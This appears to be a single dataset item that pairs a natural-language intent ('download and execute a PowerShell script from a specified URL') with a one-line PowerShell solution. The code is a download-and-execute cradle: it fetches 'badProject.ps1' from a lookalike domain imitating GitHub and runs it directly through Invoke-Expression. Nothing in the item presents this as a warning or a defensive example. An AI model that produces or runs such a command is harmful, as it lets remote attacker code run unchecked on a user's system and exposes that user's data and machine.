# Natural language intent:
# Download and execute a PowerShell script from a specified URL.

$url = "http://ghithub.com/badProject.ps1"; Invoke-Expression (New-Object System.Net.WebClient).DownloadString($url)
